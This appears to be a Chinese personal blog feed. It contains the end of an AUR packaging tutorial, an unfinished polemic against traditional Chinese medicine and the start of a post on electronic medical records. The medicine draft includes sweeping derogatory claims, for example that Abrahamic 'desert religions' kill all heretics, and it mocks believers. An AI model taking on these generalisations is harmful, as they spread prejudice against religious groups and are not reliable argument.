<p>当然打包一些很简单、依赖很明确的东西，确定没必要也可以不要这一步。</p>
<h3 id="编写pkgbuild">编写PKGBUILD</h3>
<p>最快的方法是去找找有没有和你要打包的东西类似的包，然后抄一下它的PKGBUILD。</p>
<h3 id="检查">检查</h3>
<p>先用namcap检查一下，有没有语法错误或者其他不符合规范的地方</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">namcap PKGBUILD<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h3 id="编译">编译</h3>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">makepkg -s<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>生成的<code>XXX.tar.xz</code>可以再用<code>namcap</code>检查一下</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">namcap XXX.tar.xz<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h3 id="上传和分享">上传和分享</h3>
<h4 id="aur">AUR</h4>
<p>如果想分享出来，你可以上传到AUR仓库里面。AUR帐号随便就能注册几乎没有审查的（所以传点恶意代码上去也能传的），但是尽量不要把有版权问题之类的东西传上去（虽然出了事应该是你自己负责）</p>
<p>新建一个账号，然后上传你的SSH公钥和密钥指纹。</p>
<p>用<code>git clone</code>拉取一个</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> clone ssh://aur@aur.archlinux.org/your-package-name.git <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>AUR软件仓库需要<span class="exturl" data-url="aHR0cHM6Ly93aWtpLmFyY2hsaW51eC5vcmcvaW5kZXgucGhwLy5TUkNJTkZPXyjnroDkvZPkuK3mlocp">SRCINFO<i class="fa fa-external-link-alt"></i></span>,不然会拒绝你的提交</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">makepkg --printsrcinfo <span class="token operator">></span> .SRCINFO<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h4 id="非官方软件仓库">非官方软件仓库</h4>
<p>或者你可以去其他非官方的仓库，这有一大堆：<span class="exturl" data-url="aHR0cHM6Ly93aWtpLmFyY2hsaW51eC5vcmcvaW5kZXgucGhwL1Vub2ZmaWNpYWxfdXNlcl9yZXBvc2l0b3JpZXNfKOeugOS9k+S4reaWhyk=">Unofficial user repositories<i class="fa fa-external-link-alt"></i></span></p>
<p>中文用户人最多的是ArchlinuxCN，我猜你很熟悉这个了。</p>
<p>其他的还有chaotic-aur（里面的包不少，但是国内速度很慢，镜像都在国外，直接访问可能比从AUR拉下来编译还慢），arch4edu（一些教育软件和包，清华的弄得，国内速度还行），blackarch（这个包也很多，约等于arch系的kali源）</p>
<p>要添加到这些非官方仓库里，可以请求打包，或者跟仓库管理员py。</p>
<p>或者可以自建一个仓库。</p>
<p>可参考：</p>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cuYWxveGFmLmNvbS8yMDIwLzA2L2J1aWxkX2F1cl93aXRoX2dpdGh1Yl9hY3Rpb25zLw==">利用 GitHub Actions 编译 AUR 包并建立自己的软件源<i class="fa fa-external-link-alt"></i></span></p>
<h2 id="一些工具">一些工具</h2>
<h3 id="namcap">namcap</h3>
<p>用来检查打包是否正确</p>
<h3 id="devtools">devtools</h3>
<p>可以干很多事情，最常用的是新建一个干净的环境用来测试你的包。</p>
<p>还有很多用法去看文档吧，</p>
<h3 id="debtap">debtap</h3>
<p>大多数情况下可以快速把deb包转成aur包 有些deb的包或者rpm的包可以拆包然后重新手动打包一下。一般的用debtap可以解决大部分deb包，有些依赖可能没办法需要手动处理。</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">yay -Syu debtap
<span class="token function">sudo</span> debtap -u <span class="token comment">#同步数据库，可能比较慢</span>
debtap -p XXX.deb <span class="token comment"># -p 选项生成PKGBUILD</span>
<span class="token comment">## 然后根据提示输入包名和协议等</span>
<span class="token comment">## 然后稍等一会，会比较慢</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>然后<code>pacman -U XXX.tar.xz</code>可以装到你的电脑上试一下。</p>
<h3 id="pip2pkgbuilds">pip2pkgbuilds</h3>
<p>将pip的包转成aur的包，这个工具很久没更新了（But it works）</p>
<h2 id="自动化">自动化</h2>
<p>人肉测试每个包然后传上去给大家用是最好的，不过有的上游更新太勤测试不过来，或者一些<span class="exturl" data-url="aHR0cHM6Ly93aWtpLmFyY2hsaW51eC5vcmcvaW5kZXgucGhwL1ZDU19wYWNrYWdlX2d1aWRlbGluZXNfKOeugOS9k+S4reaWhyk=">用版本控制紧跟上游的包<i class="fa fa-external-link-alt"></i></span> <del>又或者有的时候你想让用户当小白鼠</del></p>
<p>可以试试Travis CI、Github Action 之类的CI/CD工具，不过最好还是更新之前人肉测试一下</p>
<h3 id="github-action">Github Action</h3>
<p>Github Action的好处是可以白嫖（划掉</p>
<p>可以用Github Action自动生成PKGBUILD： <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL21hcmtldHBsYWNlL2FjdGlvbnMvcHVibGlzaC1hdXItcGFja2FnZQ==">publish-aur-package<i class="fa fa-external-link-alt"></i></span></p>
<p>鸭鸭的<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0R1Y2tTb2Z0L2J1aWxkLWF1ci1hY3Rpb24=">build-aur-action<i class="fa fa-external-link-alt"></i></span>,用Github Action编译一个AUR包（有时候你不想在自己电脑上编译可以试试这个）</p>
<p>使用见：<span class="exturl" data-url="aHR0cHM6Ly92aWZseXRoaW5rLmNvbS9Vc2VfR2l0SHViQWN0aW9uc190b19idWlsZF9BVVIv">GitHub Actions 打造 AUR 打包下载一条龙服务<i class="fa fa-external-link-alt"></i></span></p>
<h2 id="一些小问题">一些小问题</h2>
<h3 id="aur的依赖包makepkg无法自动识别">AUR的依赖包makepkg无法自动识别</h3>
<p>打包的时候如果依赖AUR的包，在<code>makepkg -s</code>pacman是不会自动安装的需要手动安装</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">error: target not found: python-django-cors-headers
<span class="token operator">==</span><span class="token operator">></span> ERROR: <span class="token string">'pacman'</span> failed to <span class="token function">install</span> missing dependencies.
<span class="token operator">==</span><span class="token operator">></span> ERROR: Could not resolve all dependencies.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>如果依赖太多装不过来，可以加<code>makepkg -d</code>参数忽略依赖，然后对生成的<code>XXX.tar.xz</code>使用yay或者pikaur之类的AUR helper</p>
<h3 id="git初次commit不包含srcinfo导致拒绝提交">git初次commit不包含SRCINFO导致拒绝提交</h3>
<p>可以用<code>git filter branch</code></p>
<p>（其实直接删了重新<code>git init</code>可能更快）</p>
<h2 id="常见写法和命令">常见写法和命令</h2>
<h3 id="install命令">install命令</h3>
<p>用过<code>cmake</code>等编译工具的人应该对<code>make install</code>很熟了，它在PKGBUILD里面大概像这样</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function-name function">package</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token function">make</span> -C <span class="token string">"<span class="token variable">$pkgname</span>-<span class="token variable">$pkgver</span>"</span> <span class="token assign-left variable">DESTDIR</span><span class="token operator">=</span><span class="token string">"<span class="token variable">$pkgdir</span>"</span> <span class="token function">install</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>在PKGBUILD里面，还经常用它把文件安装到制定目录，并指定权限（一般不用<code>cp</code>来干这种事）</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function-name function">package</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token builtin class-name">cd</span> <span class="token string">"<span class="token variable">$srcdir</span>/<span class="token variable">$pkgname</span>"</span>
  <span class="token function">install</span> -vDm <span class="token number">644</span> <span class="token variable">$&#123;pkgname<span class="token operator">%</span>-git&#125;</span><span class="token punctuation">&#123;</span>,.plugin<span class="token punctuation">&#125;</span>.zsh <span class="token punctuation">\</span>
    -t <span class="token string">"<span class="token variable">$&#123;pkgdir&#125;</span>/usr/share/zsh/plugins/<span class="token variable">$&#123;pkgname&#125;</span>/"</span>
  <span class="token function">install</span> -Dm644 LICENSE <span class="token string">"<span class="token variable">$pkgdir</span>"</span>/usr/share/licenses/<span class="token variable">$pkgname</span>/LICENSE
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>将可执行文件和LICENSE分别放到指定目录，像LICENSE或者doc权限644就好了，其他的可执行文件酌情给个755权限。</p>
<p>如果有需要打印详细安装信息方便调试，可以加<code>-v</code>选项，像这样<code>install -Dvm755</code></p>
<h3 id="常见写法">常见写法</h3>
<p>获取Github Release</p>
<h2 id="练手推荐">练手推荐</h2>
<p>上手AUR打包基本只需要一点bash脚本的知识就可以了。当然最好还要对打包的项目和所用的语言、框架、依赖比较熟悉。</p>
<p>反正我感觉比deb和rpm的打包简单太多了，而且由于包管理的机制，虽然容易挂，但是依赖一般不会特别麻烦（除了有些要拆包的东西）</p>
<p>你看看依赖问题<span class="exturl" data-url="aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzI5MTYwNjEyOC9hbnN3ZXIvMTE5NDU5NjU5MQ==">都把隔壁deb系的老哥逼成什么样了<i class="fa fa-external-link-alt"></i></span>。</p>
<p>可以看这个<span class="exturl" data-url="aHR0cHM6Ly9kZXZlbG9wZXIuaWJtLmNvbS96aC9hcnRpY2xlcy9sLWxvLXJwbS1idWlsZC1wYWNrYWdlLw==">Linux 中 RPM 的构建与打包<i class="fa fa-external-link-alt"></i></span>感受一下打包流程 （当然rpm包用<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2pvcmRhbnNpc3NlbC9mcG0=">fpm<i class="fa fa-external-link-alt"></i></span>之类的打包工具也没有那么麻烦）</p>
<p>官方的打包示例是要用到make编译c/c++包的例子，但是一些c/c++的包，运行环境和依赖会比较麻烦，而且在x86和arm等不同架构下面也会有很多问题。拿来熟悉打包流程对萌新不太友好。</p>
<p>练手打包建议用从自己最熟悉的项目和语言开始。如果你什么语言都不熟悉呢，推荐用一些主题或者可以用debtap之类的工具方便的转成AUR包的东西来熟悉一下打包。</p>
<p>有的系统主题、grub主题、输入法主题之类的包比较好打包，一般来说依赖也少，不会搞出什么大问题。而且主题的文件存放位置和PKGBUILD里面的其他东西可以找AUR里面打包好的其他主题参考，基本大同小异，上手打包不会有太太高难度和坑，不太熟悉流程的可以先用一些主题练手熟悉一下打包流程。（主要是这个依赖也少，破坏性比较小，萌新打出低质量的AUR包也不至于把装这个包的人一波带走闯下大祸）</p>
<p>而且他们不需要编译，也没有依赖报错，总之非常的适合熟悉一下PKGBUILD的流程</p>
<p>当然打包不能包揽所有工作，一些设置需要用户手动启用或者修改的（比如一些配置，又比如systemd之类的daemon），比如我这里打包了一个GRUB的Cyberpunk主题，需要用户手动修改</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">vim</span> /etc/default/grub<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">GRUB_THEME</span><span class="token operator">=</span><span class="token string">"/usr/share/grub/themes/Cyberpunk/theme.txt"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">grub-mkconfig</span> -o /boot/grub/grub.cfg<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>需要用户手动修改设置来启用（基本上主题、桌面挂件之类的包都是这么做的）</p>
<h2 id="闲话">闲话</h2>
<p>暑假的时候打了十几个野包，当时水平也菜，刚洗手变成Arch玩家没多久，打的十几个包都没放到AUR上丢人。虽然现在还是真蒟蒻在群里围观各路大佬卖弱不敢说话，看到中文的打包教程这么少，决定还是写点什么。</p>
<p>当时搜AUR打包相关的资料，发现相关的文章、博客、资料并不多（尤其是中文的）。中文资料保守估计不到Archlinux安装教程的百分之一，也不到deb、rpm、Flatpak打包教程的百分之一。</p>
<p>Archlinux安装弄的这么难初衷可能是为了筛掉一部分小白和伸手党，不过网上各路保姆级安装教程（一步一步手把手教的视频演示那种）和各种一键安装脚本和 Arch based 的发行版基本上快让<span class="exturl" data-url="aHR0cHM6Ly93aWtpLmFyY2hsaW51eC5vcmcvaW5kZXgucGhwL0FyY2hfTGludXhfKOeugOS9k+S4reaWhyk=">Arch的理念<i class="fa fa-external-link-alt"></i></span>流产了(特别是广为诟病的Manjaro和网上一大堆不负责任的教程，一口一个适合小白，动不动就教人添加ArchlinuxCN源，搞得很多打包者不堪骚扰)</p>
<p>小白倒没什么，主要是被伸手党搞怕了。</p>
<p>独立打一个包应该不会比独立装一个Archlinux难（不考虑Nvidia双显卡博通网卡阴间主板诡异驱动等....）。<br />
如果一个用户能参照ArchWiki独立装好、配置好自己的Arch，那就应该有能力自己打包。<br />
Arch没有Mac、Windows、ChromeOS那样的财大气粗的公司和掏钱买服务的客户，甚至不能跟RHEL和Ubuntu比，社区纯靠热情。而且由于deb系和rpm系用户众多，基本大部分软件如果支持Linux会给出deb或者rpm的包，有的可能会给个appimage的包，Arch的支持基本没太多上游会管，很多包都是Arch的维护者和用户自行编译打包的（不少还是deb拆包转的）。 伸手党太多而打包者太少，那就离凉凉不远了。<br />
下次看到没有包当伸手党可不好，没有包就自己打一个吧。</p>
<h2 id="参考和推荐阅读">参考和推荐阅读</h2>
<p><span class="exturl" data-url="aHR0cHM6Ly93aWtpLmFyY2hsaW51eC5vcmcvaW5kZXgucGhwL0RldmVsb3Blcldpa2k6SW5kZXg=">DeveloperWiki<i class="fa fa-external-link-alt"></i></span> 里面关于打包的部分可以看看<br />
<span class="exturl" data-url="aHR0cHM6Ly93aWtpLmFyY2hsaW51eC5vcmcvaW5kZXgucGhwL0FyY2hfcGFja2FnZV9ndWlkZWxpbmVz">Arch package guidelines<i class="fa fa-external-link-alt"></i></span> Arch官方的打包指南<br />
[PKGBUILD_(简体中文)]https://wiki.archlinux.org/index.php/PKGBUILD_(简体中文) PKGBUILD的简要介绍<br />
<span class="exturl" data-url="aHR0cHM6Ly93aWtpLmFyY2hsaW51eC5vcmcvaW5kZXgucGhwL01ha2Vwa2dfKOeugOS9k+S4reaWhyk=">Makepkg_(简体中文)<i class="fa fa-external-link-alt"></i></span> Makepkg也比较重要，有需要可以参考维基修改一下参数<br />
<span class="exturl" data-url="aHR0cHM6Ly9mZWxpeGMuYXQvMjAxNy8wOC9tYWtlLWFuLWFyY2gtcGFja2FnZS1mb3ItcHl0aG9uLW1vZHVsZS8=">给 Arch 打一个包 – Python 模块篇<i class="fa fa-external-link-alt"></i></span> python的包经常没什么人愿意打（确实依赖比较麻烦，好在有肥猫，打了一大堆python包），希望多来点熟悉python的大佬<br />
<span class="exturl" data-url="aHR0cHM6Ly9tYW4uYXJjaGxpbnV4Lm9yZy9tYW4vUEtHQlVJTEQuNQ==">PKGBUILD参考手册<i class="fa fa-external-link-alt"></i></span> Arch官网的参考手册，话说Arch最近新上的<span class="exturl" data-url="aHR0cHM6Ly9tYW4uYXJjaGxpbnV4Lm9yZy8=">手册索引<i class="fa fa-external-link-alt"></i></span>挺香的（btw I use tldr）<br />
<span class="exturl" data-url="aHR0cHM6Ly93d3cudnVsdHIuY29tL2RvY3MvYnVpbGRpbmctcGFja2FnZXMtb24tYXJjaC1saW51eA==">Building Packages on Arch Linux (Including the AUR)<i class="fa fa-external-link-alt"></i></span> Vultr的教程（我也不知道Vultr怎么会有这种东西）<br />
<span class="exturl" data-url="aHR0cHM6Ly9qdW55dXNzaC5naXRodWIuaW8vcC9hcmNoLWxpbnV4LXBhY2thZ2UtcXVpY2stc3RhcnQv">Arch Linux 第一次打包就上手<i class="fa fa-external-link-alt"></i></span> 新手可以看看这个</p>
]]></content>
      <categories>
        <category>不务正业系列</category>
      </categories>
      <tags>
        <tag>AUR</tag>
        <tag>Archlinux</tag>
      </tags>
  </entry>
  <entry>
    <title>死灰复燃的传统医学</title>
    <url>/curse-of-traditional-medicine/</url>
    <content><![CDATA[<p>舆论的阵地，你不占领，鸿茅药酒就要来占领。施工中，完成度20% <a id="more"></a></p>
<h2 id="前言">前言</h2>
<p>其实这些我是不想写的，<strong>奈何舆论的阵地，你不占领，鸿茅药酒就要来占领</strong>。</p>
<p>当江湖骗子在街头和电视卖假药的时候，可以不必浪费时间跟他们纠缠。当骗子们拥有约谈封号、跨省抓人的、进小学课本、进国药准字、上央视推荐、大幅掏空医保的势力时，随便一个药企能拿出几亿的广告费颠倒黑白的时候，再不反击，就没机会了。</p>
<h2 id="如何面对传统医学拥趸">如何面对传统医学拥趸</h2>
<p>网上冲浪几年一点不成熟的小建议：</p>
<p>不要浪费太多时间在没法被说服的人身上。</p>
<p>看看是不是真傻还是不慎被骗了能抢救一下，真·信中医 又跟你没多少关系的直接拉黑。</p>
<p>七大姑八大姨等家人能劝就劝吧，劝不了随他们去吧。</p>
<p>中医学生、从业人员、利益相关的企业</p>
<h2 id="称谓问题">称谓问题</h2>
<blockquote>
<p>这不是真正的中医</p>
</blockquote>
<p>就像每一个温和的穆斯林教徒在恐怖分子boom之后说“这不是真正的穆斯林”，很多中医粉在争辩不过别人的时候也会撒泼打滚，“那是你没见过真正的中医，那是庸医”。</p>
<p>所以我不打算讨论到底什么是真正的中医。</p>
<p>按照循证医学的说法是可以分为</p>
<ul>
<li>经验医学</li>
<li>循证医学</li>
</ul>
<p>这种分类法没有给宗教巫术和玄学骗子留位置（很多东西患者认为这是医学、国家也声称这是医学、骗子也管这个叫医学），而且循证医学/经验医学的标准争议本来就比较大，这里暂不讨论这些东西。</p>
<p>这里我主要用下面这种说法，这是我感觉最好的一种说法，就像“传统武术”一样：</p>
<ul>
<li>现代医学</li>
<li>传统医学</li>
</ul>
<p>当然传统医学很有可能比现代医学年轻得多，就像街边号称百年老店和传统武术，实际只是商家骗子们自己发明的，实际历史只有三十年，比我大不了多少。不过大家乐于称其为“传统XX”，各方都能接受的说法。 当然平时你是看不到上面那些说法的，国内通用的分类方法是：</p>
<ul>
<li>中医</li>
<li>西医</li>
</ul>
<p>这是一百年前把土豆叫做“洋芋”，把水泥叫做“洋灰”那个时候一直遗留下来的叫法，这是最差的一种分类法。硬生生搞出中医/西医的区别，无数人为了到底什么是中医争执不休。当然还附带绑定了政治化和民族色彩，否定中医会被扣上崇洋媚外的帽子，粉红和公知纷纷下场参战。</p>
<h2 id="区别对待">区别对待</h2>
<p>首先中医医师资格考试要求低，然后考研分数低，开诊所要求低，中药中成药上市标准低，中医临床研究要求低</p>
<!-- 
我亲身经历你电某华西毕业的老师（从本科到博士到工作全都是公卫）在医学统计课上吹捧中医。


当然你要说是几千年的经验，

“我信中医，但我自己不用”，那请您赶快坐到主席台上来

>他们黑中医！
>他们是怎么黑中医的？
>他们把中医干过的事和典籍上的内容又说了一遍。

举秀才，不知书
举孝廉，父别居
寒素清白浊如泥
高第良将怯如鸡
 -->
<h2 id="巫医的次生灾害">巫医的次生灾害</h2>
<h3 id="危害野生动植物">危害野生动植物</h3>
<p>由于传统医学没能用阴阳五行</p>
<h3 id="危害化石和考古">危害化石和考古</h3>
<p>连化石都不放过。</p>
<h3 id="危害青少年身体健康">危害青少年身体健康</h3>
<p>很多人不是脑子不好使信中医，小时候被脑子不好使的父母带着吃中药，结果吃出肾衰竭。 你说巫医只危害</p>
<h3 id="挑拨医患关系">挑拨医患关系</h3>
<p>患者不信任现代化工品、医药、医学仪器（核磁共振什么的最有辐射啦！），病人质疑西医跑过来医闹你们中医/藏医/苗医/跳大神的没少过来挑拨矛盾吧</p>
<h3 id="抢功劳">抢功劳</h3>
<h3 id="疫情">疫情</h3>
<p>蝙蝠啊，穿山甲啊。。。</p>
<h2 id="为什么要写这个">为什么要写这个</h2>
<p>这几年借着“伟大复兴”，国学乡贤死灰复燃。当然中医也不甘寂寞，不仅国家鼓励医保开中成药，甚至直接进入了中小学教材，还企图立法打击中医黑。</p>
<p>不仅中医，藏医、苗医都冒出来了，甚至蒙医都能死灰复燃（蒙古大夫都成神医了）。</p>
<p>有些噶韭菜市场和安慰剂市场是客观存在的，你不去占领，别人也要去占领。打倒了封建迷信，人们考前不去拜孔老二，照样要去朋友圈转发锦鲤；不信生辰八字，照样要去信星座。韭菜不被老中医的神药骗，也要被量子治疗和纳米保健骗。</p>
<blockquote>
<p>中医确实能通过缩短寿命来解决老龄化问题，而且缩短寿命这些人都真心相信中医有用，这一点现代医学无论如何做不到</p>
</blockquote>
<p>你看，信中医的人就去信，不信的也不浪费时间和生命跟他们吵，井水不犯河水不好吗？。然而世上远没有这种好事，这些东西和宗教一样，得寸进尺，贪婪无厌。见过很多医生都是知道怎么回事，但是以多一事不如少一事的态度在和稀泥看戏，反正事不关己高高挂起。 这是不行的，这样下去，今天说中医两句不来找你 好被中医粉举报封号了，明天你就发现乱说一句就违法跨省了；后天就变成依法抓人了；大后天不用跨省了，你说一句钟南山和中医的不好人民群众当场将你打倒。</p>
<p>那独善其身不好吗，嗯，对于5G这种态度是可行的。</p>
<blockquote>
<p>我也这么认为。</p>
<p>但有些事情想的太透，反而会让自己觉得无力。</p>
<p>如果看到下面这些话术，笑笑就好，别尝试反驳，没用的。</p>
<ul>
<li>5G在民用感知不到，主要应用在工业。</li>
<li>新技术出来受到质疑很正常，那些说5G没用的人，到时候又会真香了。</li>
<li>2G是文字、3G是图片、4G是视频、5G是VR和物联网等等。</li>
<li>美国抵制华为，是害怕了华为的5G，你比美国总统聪明？</li>
<li>现在没有需求很正常，等5G铺设好，自然就有需求了。</li>
<li>古人也觉得枪炮没用、以前的人也觉得马车比汽车好、等等。</li>
<li>5G的应用在VR、AR、自动驾驶、远程医疗、物联网等等。（最经典）</li>
<li>5G里面有支持到一些较低的频段，所以以后5G覆盖小的问题能解决的。</li>
<li>速度只是5G最无聊的应用。</li>
<li>等iPhone出5G手机，那些说5G没用的人就会真香了。</li>
<li>未来4K、8K流媒体需要5G。</li>
<li>AR、VR需要5G。</li>
<li>云电脑需要5G，等以后5G普及了，只要一个屏幕就能用了，连处理器都不需要。</li>
<li>5G普及之后，资费就下降了。</li>
<li>短视频是4G催生的。</li>
</ul>
<p>这些应该能够覆盖到八九成吹5G的人的常用话术了。当然<strong>以上话术都能够证伪。</strong></p>
<p>记住，<strong>不要尝试反驳，他们比你想的要闲，你说再多作证，他们也当作没看到，不要和他们聊关于网速的常识，他们转眼就忘了，当他们吹无可吹就扯未来不可期。除了被他们气的胸闷，啥都捞不着。</strong></p>
</blockquote>
<p>菊花再怎么折腾，反正运营商基站电费亏爆了套餐提价每个月流量费大不了多花十几块钱，犯不着为了这点钱在网上跟人吵架。</p>
<p>但是这种事情怎么说呢？你不去骂中医，中医也要来找你，躲是躲不过的。就危害程度，传统医学的鼓吹者和信徒们大致和爱狗人士相当：</p>
<ul>
<li><p>你看深圳这不是立法禁食狗肉了。</p></li>
<li><p>你看这信徒完全不讲理的态度</p></li>
<li><p>你看这救助站和爱心捐款疯狂骗小清新的钱</p></li>
<li><p>你看这危害人身安全</p></li>
<li><p>你看这动不动上纲上线西方文明封建陋习</p></li>
</ul>
<p>当然不排除将来演变成类似八十年代气功之类的东西，邪恶程度和道教佛教相当，略弱于杀灭一切异端的伊斯兰基督犹太等沙漠神教。</p>
<p>传统医学的利益集团已经成型，</p>
<p><span class="exturl" data-url="aHR0cDovL3d3dy5nb3YuY24vemhlbmdjZS9jb250ZW50LzIwMjEtMDIvMDkvY29udGVudF81NTg2Mjc4Lmh0bQ==">国务院办公厅印发关于加快中医药特色发展若干政策措施的通知<i class="fa fa-external-link-alt"></i></span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly9ib29rLmRvdWJhbi5jb20vc3ViamVjdC8zMDMxMTgxNi8=">荒诞医学史(Quackery : A Brief History of the Worst Ways to Cure Everything)<i class="fa fa-external-link-alt"></i></span></p>
<p>各位中医，抢功劳无妨，但请不要无辜送死</p>
<h2 id="众生百态">众生百态</h2>
<h3 id="电视">电视</h3>
<p>电视没什么疑问，是各路骗子（倒也不仅仅是打着传统医学旗号的骗子，莎普爱思之类的看起来像西医的骗子也挺多）和中医的主要阵地。 当年</p>
<h3 id="网上冲浪所见">网上冲浪所见</h3>
<p>这里仅凭个人印象和观察记录一下</p>
<p>微信朋友圈是养生营销号和各种uc震惊体文章的聚集地，长辈最爱，不说了。</p>
<p>在中医、一些保健品</p>
<p>近几年反中医的阵地大概是丁香园等医学论坛</p>
<p>作为反中医的前沿阵地一到了疫情和钟南山之类的话题下也崩了</p>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzM4MTg2NzEzMw==">如何看待我国用中药（连花清瘟胶囊）支援意大利？<i class="fa fa-external-link-alt"></i></span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzM4NzgxNDkxOA==">如何看待钟南山院士认为中药对新冠肺炎有效？<i class="fa fa-external-link-alt"></i></span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzM3OTU5MTE2Nw==">如何看待钟南山向欧洲推荐中药连花清瘟胶囊与六神丸？<i class="fa fa-external-link-alt"></i></span></p>
<p>只有在这些具体到某些问题开始拿出证据和事例吵的时候知乎才能扳回一城:</p>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzQyNTg4NTAwMQ==">钟南山团队体外研究发现「白云山复方板蓝根对新冠病毒有效」，体外研究是什么？白云山板蓝根疗效如何？<i class="fa fa-external-link-alt"></i></span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzM5NTM1ODk1Ny9hbnN3ZXJzL3VwZGF0ZWQ=">如何看待钟南山否认商业代言传闻?<i class="fa fa-external-link-alt"></i></span></p>
<h2 id="习惯的形成">习惯的形成</h2>
<p>观察一下观念、习惯是如何形成和演变的，</p>
<p>很多观念都是这样的：不知道为什么，但是感觉做了没错，也没什么大危害，别人都在做我也这样吧。</p>
<h3 id="眼保健操">眼保健操</h3>
<p>眼保健操是一个挺有意思的现象</p>
<h2 id="失败的教育">失败的教育</h2>
<p>当然这里我是指</p>
<!-- 
在试行第四版和第五版中，血必净注射液（简称：血必净）在西医治疗方案中被推荐用于治疗重型和危重型病例，在中医治疗方案中被推荐用于中期“疫毒闭肺”和重症期“内闭外脱”两个证候的治疗。同期，由钟南山院士等呼吸及重症医学专家组成的课题组，紧急启动了“血必净治疗新冠肺炎疗效的前瞻性多中心临床研究”。

中国日报3月13日电（记者 吴勇 苏峰）中央指导组专家组成员、东南大学附属中大医院副院长邱海波说，中药血必净注射剂对新冠肺炎患者效果良好。相关研究表明，血必净注射液能够对冠状病毒导致的炎症因子风暴或者炎症反应有抑制作用，对新型冠状病毒也有一定的抑制作用。“在单臂队列研究中，血必净注射剂联合常规治疗，在新冠重型病人的治疗中有效率较高，肺炎严重指数（PSI）有所改善，(但严重程度相同的重症患者对照组结果尚需进一步统计分析)。”邱海波说。

2019年6月，《重症医学》（Critical Care Medicine,CCM）在线发表了由上海市呼吸病研究所、复旦大学附属中山医院白春学教授与北京中医药大学东直门医院商洪才研究员为共同通讯作者，复旦大学附属中山医院呼吸科宋元林教授为第一作者的《血必净注射液治疗重症社区获得性肺炎疗效的随机对照试验》研究论文。

作者：极萨学院冷哲
链接：https://www.zhihu.com/question/379591167/answer/1112365219
来源：知乎
著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。

作者：极萨学院冷哲
链接：https://www.zhihu.com/question/379591167/answer/1112365219
来源：知乎
著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。



血必净
如何看待知乎用户立党质疑钟南山院士的天津红日血必净对新冠肺炎的治疗效果? - 迷幻布鲁琪的回答 - 知乎
https://www.zhihu.com/question/393021607/answer/1206071820

[新版中医药教材发布，将纳入中小学课本！](https://www.medsci.cn/article/show_article.do?id=fb39109063d9)



开展*中医**药*文化宣传和知识普及活动，应当遵守国家有关规定，符合*中医**药*文化内涵和发展规律。任何组织或者个人*不得*对*中医**药*作虚假、夸大宣传；*不得*冒用*中医**药*名义牟取不正当利益、损害社会公共利益；*不得*以任何方式或行为*诋毁*、*污蔑**中医**药*
 -->
<p>国药准字Z</p>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cuZHh5LmNuL2Jicy9uZXd3ZWIvcGMvcG9zdC8zNDY5NzE2Mg==">反中医被丁香园封号了，丁香园不是说宣传科学吗？<i class="fa fa-external-link-alt"></i></span></p>
<p>https://zhuanlan.zhihu.com/p/31861831</p>
]]></content>
      <tags>
        <tag>医药</tag>
        <tag>中医</tag>
      </tags>
  </entry>
  <entry>
    <title>处理电子病历</title>
    <url>/81d4/</url>
    <content><![CDATA[<p>有两种鬼画符，一种是医生的字，一种是正则表达式 <a id="more"></a></p>
<p>周某出狱了，而我也开始打工了，咳咳</p>
<p>最近开始折腾电子病历之类的东西，有几家医院的原始数据，几乎都是xml之类的（都是接口导出的，反正从医院要不到数据库里面的原始数据），不同医院数据格式和医生书写风格差的还挺大。</p>
<p><em>下面这些基本都是用的python的库</em></p>
<h2 id="解析和提取内容">解析和提取内容</h2>
<h3 id="脱敏">脱敏</h3>
